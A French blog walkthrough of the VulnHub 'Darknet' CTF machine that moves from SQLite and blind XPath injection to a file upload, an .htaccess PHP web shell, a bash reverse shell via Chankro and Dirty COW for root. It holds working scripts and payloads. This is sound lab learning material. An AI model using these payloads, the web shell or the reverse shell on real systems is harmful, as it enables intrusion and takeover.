# Solution du CTF Darknet de VulnHub

Il y a bien fort longtemps dans notre galaxie j'avais commencé le CTF [Darknet](https://www.vulnhub.com/entry/darknet-10,120/) créé par *q3rv0*.  

Ça devait être à peu près en juillet 2015, après j'ai été occupé à changer de taff, déménager, avoir une gamine, retravailler sur [Wapiti](http://wapiti.sourceforge.net/)... La vie quoi.  

Mais tenace jusqu'au boût la VM restait sur mon disque et le CTF dans ma mémoire, il faut avouer qu'il était tenace lui aussi.  

Conséquence directe de tout ça, les scripts présents dans cet article sont en Python 2. 0ldSk3wl br0!  

Une totale liberté de pensée cosmique...
----------------------------------------

```plain
Nmap scan report for 888.darknet.com (192.168.1.69)
Host is up (0.0027s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Login - 888
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          40246/tcp  status
|_  100024  1          49484/udp  status
40246/tcp open  status  1 (RPC #100024)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          40246/tcp  status
|_  100024  1          49484/udp  status
MAC Address: 08:00:27:35:C7:24 (Cadmus Computer Systems)
```

L'expérience m'a montré que généralement les CTF qui n'ont pas de serveur SSH sont un peu... pointilleux.  

On se rend alors sur la page d'index quasi vide, logo un peu travaillé quand même.  

Quitte à avoir l'impression de répéter les même étapes à chaque CTF on lance un petit buster qui s'avère payant :  

```plain
[+] Lancement du module buster
+ Testing directory http://192.168.1.69/
Found webpage http://192.168.1.69/index
Found webpage http://192.168.1.69/access
Found webpage http://192.168.1.69/Classes
Found webpage http://192.168.1.69/sec.php
```

Le listing est activé sur /access et on y trouve un fichier *888.darknet.com.backup* qui est une copie de la configuration Apache :  

```plain
<VirtualHost *:80>
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
</VirtualHost>
```

On peut déjà en déduire l'existence d'un utilisateur baptisé *devnull*.  

Le listing étant aussi actif sur */Classes* on trouve deux fichiers *Show.php* et *Test.php* qui retournent une erreur 500.  

Comme il en est de même pour le script *sec.php* on rajoute une entrée dans notre */etc/hosts* et on se rend sur l'hôte virtuel vu plus tôt.  

On atterrit alors sur une page de login classique (nom d'utilisateur et mot de passe à saisir). Si on rentre un double-quote en nom d'utilisateur on obtient juste un message d'échec (FAIL).  

Si on rentre une apostrophe c'est plus intéressant (note: le hash MD5 correspond au pass que l'on a saisit) :  

![DarNet CTF SQLite3 error 1](https://raw.githubusercontent.com/devl00p/blog/master/images/darknet/darknet_single_quote.png)

Et sur la saisie d'une apostrophe suivi de double-quote c'est encore plus verbeux :  

![DarNet CTF SQLite3 error 2](https://raw.githubusercontent.com/devl00p/blog/master/images/darknet/darknet_single_double_quote.png)

Si l'on tente de fermer la requête qui semble être de la forme *select \*\*\* from \*\*\* where usurario = <user> and pass = hash(<pass>)* avec *' OR 1 #* on obtient l'erreur suivante :  

```plain
unrecognized token: "#"
```

Il semble donc que l'on ne soit pas en présence d'une injection MySQL :| De plus certains mots clés (select, union, and) et caractères (point virgule, double-tirets, inférieur et supérieur) semblent être filtrés et retournent l'erreur *Illegal* sans plus de détails.  

Pour une machine Linux il n'y a pas énormément de possibilités comme DB supportée par PHP et on en déduit qu'il s'agit d'[une injection sur base SQLite3](http://atta.cked.me/home/sqlite3injectioncheatsheet).  

[La documentation](https://www.sqlite.org/lang_comment.html) stipule que l'on peut utiliser des commentaires multi-ligne dans le style du langage C sans avoir à fermer le tag, ce qui s'avère payant avec le payload suivant :  

```plain
admin' or 1 limit 1 /*
```

Cela nous amène à un textarea avec la mention *Administrador SQL*. On peut faire exécuter des requêtes SQLite3 mais le script est tellement peu verbeux qu'on obtient aucun output ni erreur... Il faut donc l'exploiter en aveugle.  

La configuration Apache vu plus tôt est donc d'une aide capitale pour créer une nouvelle base SQLite3 qui sera aussi un script PHP à nous :  

```plain
ATTACH DATABASE '/home/devnull/public_html/img/shell.php' as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ("<?php phpinfo(); ?>");
```

... vers un nouvel age réminiscent
----------------------------------

Au vu du *phpinfo()* obtenu on se dit que l'on n'est pas encore au bout de nos peines avec une bonne poignée de fonctions désactivées (*system, eval, shell\_exec, passthru, popen, proc\_open, escapeshellarg, escapeshellcmd, exec, proc\_close, proc\_get\_status, proc\_nice, proc\_terminate, pcntl\_exe*).  

La version du kernel date un peu (*Linux Darknet 3.2.0-4-486 #1 Debian 3.2.65-1+deb7u2 i686*) bien que pas trop lorsque le CTF a été créé :p   

On trouve d'autres informations d'importance dans */etc/php5/cgi/php.ini* (on ne peut pas avoir de shell en raison des fonctions désactivées mais on peut au moins faire un *readfile()* :  

```plain
allow_url_fopen allow_url_include On
user_ini.filename .user.ini
open_basedir /etc/apache2:/home/devnull:/tmp
```

J'ai choisi de déposer deux scripts PHP sur le serveur, celui qui fait le readfile() et un second qui fait un include(). Avec l'inclusion distante on peut faire exécuter du code PHP de notre choix sans avoir à uploader à chaque fois un fichier.  

On créé d'abord le script que l'on souhaite en local (*index.html*) :  

```php
<?php                                                                                                                  
$dir = '/etc/apache2/sites-enabled/';                                                                                  
$files = scandir($dir);                                                                                                

print_r($files);                                                                                                       
?>
```

Et on le sert avec un serveur web qui ne l'interprète pas (*python3 -m http.server)*.  

J'utilise enfin le script d'inclusion pour l'interpréter sur le serveur :  

```plain
http://888.darknet.com/img/inc.php?p=http://192.168.1.3:8000/
```

De cette façon on découvre un autre hôte virtuel :  

```plain
Array
(
    [0] => .
    [1] => ..
    [2] => 000-default
    [3] => 888.darknet.com
    [4] => signal8.darknet.com
)
```

Voici les fichiers de configuration correspondants à *000-default* et *signal8* :  

```plain
<VirtualHost *:80>
	ServerAdmin webmaster@localhost

	DocumentRoot /var/www
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory /var/www/>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>

	ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	<Directory "/usr/lib/cgi-bin">
		AllowOverride None
		Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
		Order allow,deny
		Allow from all
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log

	# Possible values include: debug, info, notice, warn, error, crit,
	# alert, emerg.
	LogLevel warn

	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

```plain
<VirtualHost *:80>
    ServerName signal8.darknet.com
    ServerAdmin errorlevel@darknet.com
    DocumentRoot /home/errorlevel/public_html
    <Directory /home/errorlevel/public_html>
        AllowOverride All
    </Directory>
</VirtualHost>
```

Madintaïwan
-----------

Ce nouveau site contient une page permettant d'afficher des contacts (via un numéro d'ID passé en paramètre) et une section demandant des identifiants sous */xpanel* :  

```plain
+ http://signal8.darknet.com/contact.php (CODE:200|SIZE:251)
+ http://signal8.darknet.com/index.php (CODE:200|SIZE:277)
+ http://signal8.darknet.com/xpanel/edit.php (CODE:200|SIZE:298)
+ http://signal8.darknet.com/xpanel/home.php (CODE:302|SIZE:0)
+ http://signal8.darknet.com/xpanel/index.php (CODE:200|SIZE:466)
```

Pour l'ID 1 on retrouve l'utilisateur errorlevel@darknet.com (Errorlevel) et pour l'ID 2 on a devnull@darknet.com (Devnull).  

Le script est vulnérable à une forme d'injection SQL mais là encore il ne s'agit pas de MySQL mais quelque chose qui est à première vue plus basique.  

On remarque que l'on peut notamment influer sur le résultat avec des conditions supplémentaires. Par exemple les conditions suivantes permettent de conserver l'output :  

```plain
and (1=1)
and ('1'='1')
and (1<2)
and ('1'<'2')
```

J'ai alors créé un script pour tester des noms de colonnes (la wordlist utilisée est celle de sqlmap) :  

```python
import requests

url = "http://signal8.darknet.com/contact.php?id=1%20and%20{0}!=1"

sess = requests.session()

with open("/opt/sqlmap-dev/txt/common-columns.txt") as fd:
    while True:
        line = fd.readline()
        if not line:
            break

        line = line.strip()
        if not line:
            continue

        r = sess.get(url.format(line))
        if "errorlevel@darknet.com" in r.text:
            print(line)
```

On obtient les colonnes *username*, *email* et *clave* ce qui est un début.  

Malheureusement les classiques mots clés SQL (union, select) ne sont d'aucune aide. Un coup d’œil sur le *phpinfo()* récupéré plus tôt montre sous la section *DOM* que *XPATH* est supporté... indice :)  

Il existe [différents](http://securityidiots.com/Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-2.html) [documents](https://dl.packetstormsecurity.net/papers/bypass/Blind_XPath_Injection_20040518.pdf) concernant l'injection XPATH mais le plus complet reste bien sûr [la documentation XPATH](https://www.w3.org/TR/xpath/) elle-même.  

Armé de notre injection de condition on peut avoir extraire différentes informations dans ce style :  

```plain
and substring(username,1,1)='e'
and string-length(username)=10
and string-length(clave)=11
```

Brute-forcer les caractères des mots de passe n'est pas bien compliqué :  

```python
import requests
import string

url = "http://signal8.darknet.com/contact.php?id=1%20and%20substring(clave,{0},1)='{1}'"

sess = requests.session()

password = ""
for i in range(1,12):
    for c in string.ascii_letters + string.digits:
        r = sess.get(url.format(i, c))
        if "devnull" in r.text or "errorlevel" in r.text:
            password += c
            break
    else:
        password += "?"
print password
```

On obtient les identifiants pour le *xpanel* :  

```plain
devnull j4tC1P9aqmY
errorlevel tc65Igkq6DF
```

J'ai tout de même joué un peu plus avec XPATH et on peut par exemple remonter jusqu'à la node root (le premier tag du fichier XML) et obtenir la longueur de son nom via *and string-length(name(parent::node()))=4* et brute forcer à nouveau pour trouver *auth*.  

J'ai aussi trouvé une façon d'obtenir directement le mot de passe en passant *id=1]/clave | //user[id=3*. Cela remonte le résultat de la première requête (valide) mais pas de la suite.  

Ce qu'il aurait fallut pour explorer facilement le XML serait un opérateur de concaténation + au lieu de la fonction *concat()* et ses parenthèses.  

Du pain spiritique sur la planche
---------------------------------

L'accès au *xpanel* n'apporte à première vue pas grand chose... Mais en commentaire dans le HTML on trouve une référence à un script *ploy.php* qui est un code à remplir via des checkbox.  

Il s'agit bien sûr d'un script d'upload mais le fichier ne sera accepté que si on trouve le bon code...  

![DarkNet CTF upload script requiring code](https://raw.githubusercontent.com/devl00p/blog/master/images/darknet/darknet_upload_script.png)

Les valeurs de chaque checkbox sont numériques on aura donc une combinaison de ces valeurs à trouver :  

```html
<input type="checkbox" name="checkbox[]" value="37">
<input type="checkbox" name="checkbox[]" value="58">
<input type="checkbox" name="checkbox[]" value="22">
<input type="checkbox" name="checkbox[]" value="12">
<input type="checkbox" name="checkbox[]" value="72">
<input type="checkbox" name="checkbox[]" value="10">
<input type="checkbox" name="checkbox[]" value="59">
<input type="checkbox" name="checkbox[]" value="17">
<input type="checkbox" name="checkbox[]" value="99">
```

Voici un code pour trouver la bonne combinaison :  

```python
from itertools import combinations
import requests

numbers = ["37", "58", "22", "12", "72", "10", "59", "17", "99"]                                                                                                                                                                              

sess = requests.session()                                                                                                                                                                                                                     
login_data = {                                                                                                                                                                                                                                
    "username": "devnull",                                                                                                                                                                                                                    
    "password": "j4tC1P9aqmY",                                                                                                                                                                                                                
    "Action": "Login"                                                                                                                                                                                                                         
    }                                                                                                                                                                                                                                         

r = sess.post(                                                                                                                                                                                                                                
    "http://signal8.darknet.com/xpanel/",                                                                                                                                                                                                     
    data=login_data,                                                                                                                                                                                                                          
    headers={"Content-Type": "application/x-www-form-urlencoded"}                                                                                                                                                                             
    )                                                                                                                                                                                                                                         

if "Editor PHP" not in r.text:                                                                                                                                                                                                                
    print "Auth failed!"                                                                                                                                                                                                                      
    exit()                                                                                                                                                                                                                                    

for l in combinations(numbers, 4):                                                                                                                                                                                                            
    upload_data = [("Action", "Upload")]
    for k in l:
        upload_data.append(("checkbox[]", k))

    r = sess.post(
        "http://signal8.darknet.com/xpanel/ploy.php",
        data=upload_data,
        files={'imag':('phpinfo.php','<?php phpinfo(); ?>')}
        )
    if "Key incorrecta!" not in r.text:
        print "Found key", l
        print r.text
        break
```

Au bout d'un moment ça mort à l'hameçon :  

```plain
Found key ('37', '10', '59', '17')
Formato invalido!
```

On a le bon code mais l'upload de fichier php est refusé... On pourrait uploader un *.htaccess* pour rajouter une extension .yo qui serait interprétée comme PHP (voir [le writeup pour le Xerxes](http://devloop.users.sourceforge.net/index.php?article72/solution-du-ctf-xerxes)) sauf qu'à l'instar du [CTF Homeless](http://devloop.users.sourceforge.net/index.php?article150/solution-du-ctf-homeless-de-vulnhub) tout upload semble supprimer l'upload précédent... donc si on envoie le .yo, bye bye le .htaccess et pas d'interprétation du code.  

La seule solution semble être d'avoir un fichier .htaccess qui puisse provoquer l'exécution directe de code et en fouillant bien je trouve [cette astuce](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files/PHP%20.htaccess) sur le Github de *PayloadsAllTheThings*.  

Je créé alors une backdoor générique précédemment décrite [dans cet article](http://devloop.users.sourceforge.net/index.php?article128/tales-of-pentest-1-celui-qui-donnait-la-permission-file) :  

```python
from itertools import combinations
import requests

sess = requests.session()
login_data = {
    "username": "devnull",
    "password": "j4tC1P9aqmY",
    "Action": "Login"
    }

r = sess.post(
    "http://signal8.darknet.com/xpanel/",
    data=login_data,
    headers={"Content-Type": "application/x-www-form-urlencoded"}
    )

if "Editor PHP" not in r.text:
    print "Auth failed!"
    exit()

upload_data = [
        ("Action", "Upload"),
        ("checkbox[]", '37'),
        ("checkbox[]", '10'),
        ("checkbox[]", '59'),
        ("checkbox[]", '17')]

ini_content = """
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ###### <?php $func = isset($_GET["f"]) ? $_GET["f"] : ""; $arg1 = isset($_GET["a"]) ? $_GET["a"] : ""; $arg2 = isset($_GET["b"]) ? $_GET["b"] : ""; $ret_func = isset($_GET["rf"]) ? $_GET["rf"] : ""; $ret_val = ""; if ($func != "") { if ($arg1 != "" && $arg2 != "") { $ret_val = $func($arg1, $arg2); } elseif ($arg1 != "") { $ret_val = $func($arg1); } else { $ret_val = $func(); } } if ($ret_func != "") { $ret_func($ret_val); } ?>"""

r = sess.post(
    "http://signal8.darknet.com/xpanel/ploy.php",
    data=upload_data,
    files={'imag':('.htaccess', ini_content)}
    )
print r.text
```

On peut ainsi obtenir le *phpinfo()* avec l'URL http://signal8.darknet.com/xpanel/uploads/.htaccess?f=phpinfo  

Seul bémol : on s'aperçoit bien vite que l'on ne peut pas accéder aux fichiers de *errorlevel* alors que notre .htaccess est présent dans son dossier ! WTF ! On dispose cependant d'assez de droits pour lire les fichiers *Classes* et *sec.php* du début.  

Dans le phpinfo() il est mention de [suPHP](http://www.suphp.org/Home.html), un module Apache permettant de faire exécuter les scripts PHP avec les droits du propriétaire du script...  

N'ayant pas trouvé dans la documentation du projet une directive pour l'activer sur notre htaccess je ne cacherais pas le fait que j'ai trouvé la directive sur [le writeup de g0blin pour le même CTF](https://g0blin.co.uk/vulnhub-darknet-1-0-solution-writeup/).  

La ligne à ajouter dans la section *Files* était alors *SetHandler application/x-httpd-suphp*.  

Mais au vu du cheminement que j'ai pris pour la fin j'aurais très bien pu m'en passer.  

Pour les curieux voici le code PHP de la page de contact (avec le XPATH) :  

```php
<?php

//error_reporting(0);

if(!empty($_GET['id'])){
    $id=$_GET['id'];
    if(preg_match('/\*/', $id)){
        exit();
}
    $xml=simplexml_load_file("../users/usuarios.xml");
    $out=$xml->xpath("/auth/user[id={$id}]/email");
    echo "<h3>".$out[0]."</h3>";
}
?>
```

Et pour ce qui est du XML :  

```html
<auth>
  <user>
    <id>1</id>
    <username>errorlevel</username>
    <email>errorlevel@darknet.com</email>
    <clave>tc65Igkq6DF</clave>
  </user>
  <user>
    <id>2</id>
    <username>devnull</username>
    <email>devnull@darknet.com</email>
    <clave>j4tC1P9aqmY</clave>
  </user>
</auth>
```

La quête donatoire transcendantale
----------------------------------

C'est bien beau d'exécuter du code PHP mais ça ne vaut pas un vrai shell. Il doit bien exister une technique consistant à uploader une librairie et la charger par PHP pour exécuter du code natif !  

Mais oui ! Grâce à frère *TarlogicSecurity* ouvre tes [Chankro](https://github.com/TarlogicSecurity/Chankro) et toi aussi bypasse *disable\_functions* et *open\_basedir* 8-)  

Pour l'utiliser j'ai d'abord écrit le script shell suivant :  

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.2.240/9999 0>&1
```

Puis on appelle *Chankro* de cette façon pour générer le fichier *bypass.php* :  

```bash
python chankro.py --arch 32 --input rev.sh --output bypass.php --path /home/errorlevel/public_html/xpanel/upload
```

On lance préalablement un listener sur notre machine :  

```bash
socat file:`tty`,echo=0,raw tcp4-listen:9999
```

Il faut bien sûr réinjecter ce fichier dans le script d'upload vu plus tôt et finalement lors du chargement du htaccess :  

```plain
errorlevel@Darknet:/home/errorlevel/public_html/xpanel/uploads$ id
id
uid=1002(errorlevel) gid=1002(errorlevel) groups=1002(errorlevel)
```

Quand on recherche les fichiers appartenant à root mais word-writable on trouve celui-ci :  

```plain
-rwxrwxrwx 1 root root 869 Apr 26  2015 /etc/suphp/suphp.conf
```

Il dispose des entrées suivantes :  

```plain
; Minimum UID
min_uid=100

; Minimum GID
min_gid=100
```

L'objectif va être de passer ces valeurs à 0 (uid de root) pour exploiter le fichier *sec.php* appartement à root (et donc faire exécuter du code privilégié grâce à suPHP).  

On serait tenté de faire un remplacement *in-place* avec *sed -i s/100/0/ /etc/suphp/suphp.conf* sauf que sed tente d'écrire un fichier temporaire dans */etc/suphp* et les permissions nous en empêchent :'(  

C'est pour cela que dans notre cas le socat sera préférable au ncat : on peut éditer facilement le fichier avec Vi (on aura préalablement modifié le nombre de colonnes et lignes avec la commande stty).  

Voici les codes des scripts PHP appartenant à root :  

```php
// cat sec.php
<?php

require "Classes/Test.php";
require "Classes/Show.php";

if(!empty($_POST['test'])){
    $d=$_POST['test'];
    $j=unserialize($d);
    echo $j;
}
?>

// cat Classes/Show.php
<?php

class Show {

    public $woot;

    function __toString(){
        return "Showme";        

}
    function Pwnme(){
        $this->woot="ROOT";

}

}

?>

// cat Classes/Test.php
<?php

class Test {

    public $url;
    public $name_file;
    public $path;

    function __destruct(){
        $data=file_get_contents($this->url);
        $f=fopen($this->path."/".$this->name_file, "w");
        fwrite($f, $data);
        fclose($f);
        chmod($this->path."/".$this->name_file, 0644);
}
}

?>
```

L'exploitation semble on ne peut plus facile : on écrit un script qui instancie un objet Test, écrit les différentes valeurs pour lire une URL sous contrôle et recopier son contenu dans /etc/crontab puis on appelle *serialize()* avant d'envoyer le résultat vers *sec.php* :  

```plain
O:4:"Test":3:{s:3:"url";s:33:"http://192.168.2.240:8000/crontab";s:9:"name_file";s:7:"crontab";s:4:"path";s:4:"/etc";}
```

Sauf que ça ne marche pas... WTF ! Evidemment ça fonctionne sur des tests locaux... Mais il semble que d'autres ont eu des problèmes avec cette VM (espace disque insuffisant, etc).  

Finalement j'ai utilisé [l'exploit de FireFart](https://github.com/FireFart/dirtycow/blob/master/dirty.c) pour [Dirty COW](https://en.wikipedia.org/wiki/Dirty_COW) qui édite le fichier */etc/passwd* pour remplacer root par un utilisateur *firefart* avec un mot de passe de notre choix :  

```plain
firefart@Darknet:~# id
uid=0(firefart) gid=0(root) grupos=0(root)
firefart@Darknet:~# ls
flag.txt
firefart@Darknet:~# cat flag.txt
      ___           ___           ___           ___           ___           ___           ___     
     /\  \         /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    
    /::\  \       /::\  \       /::\  \       /:/  /        /::|  |       /::\  \        \:\  \   
   /:/\:\  \     /:/\:\  \     /:/\:\  \     /:/__/        /:|:|  |      /:/\:\  \        \:\  \  
  /:/  \:\__\   /::\~\:\  \   /::\~\:\  \   /::\__\____   /:/|:|  |__   /::\~\:\  \       /::\  \ 
 /:/__/ \:|__| /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:::::\__\ /:/ |:| /\__\ /:/\:\ \:\__\     /:/\:\__\
 \:\  \ /:/  / \/__\:\/:/  / \/_|::\/:/  / \/_|:|~~|~    \/__|:|/:/  / \:\~\:\ \/__/    /:/  \/__/
  \:\  /:/  /       \::/  /     |:|::/  /     |:|  |         |:/:/  /   \:\ \:\__\     /:/  /     
   \:\/:/  /        /:/  /      |:|\/__/      |:|  |         |::/  /     \:\ \/__/     \/__/      
    \::/__/        /:/  /       |:|  |        |:|  |         /:/  /       \:\__\                  
     ~~            \/__/         \|__|         \|__|         \/__/         \/__/                 

     Sabia que podias Campeon!, espero que esta VM haya sido de tu agrado y te hayas divertido
     tratando de llegar hasta aca. Eso es lo que realmente importa!.

#Blog: www.securitysignal.org

#Twitter: @SecSignal, @q3rv0
```

Richenou
--------

Ce CTF m'a donné du fil à retordre mais m'a permis de découvrir de nouveaux outils, techniques et jouer avec des failles peu courantes :)

*Published March 27 2018 at 12:02*